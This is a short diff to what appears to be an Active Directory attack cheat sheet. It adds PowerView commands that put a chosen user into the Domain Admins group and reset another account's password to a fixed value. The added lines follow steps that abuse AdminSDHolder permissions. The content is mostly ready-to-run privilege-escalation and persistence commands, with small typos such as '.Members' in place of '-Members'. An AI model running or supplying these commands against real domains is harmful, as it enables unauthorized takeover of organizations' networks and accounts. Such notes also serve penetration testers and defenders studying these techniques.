@@ -75,6 +75,12 @@ C:> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcor
 
 # Check Domain Admins Permissions with Poweriew
 C:> Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "<username>"}
+
+# Once with permissions, Add User with PowerView
+C:> Add-DomainGroupMember -Identity 'Domain Admins' .Members <username> -Verbose
+
+# Change user password
+C:> Set-DomainUserPassword -Identity <usernname> -AccountPassword (ConvertTo-SecureString "Password@" -AsPlainText -Force) -Verbose
 ```
 
 ### MORE
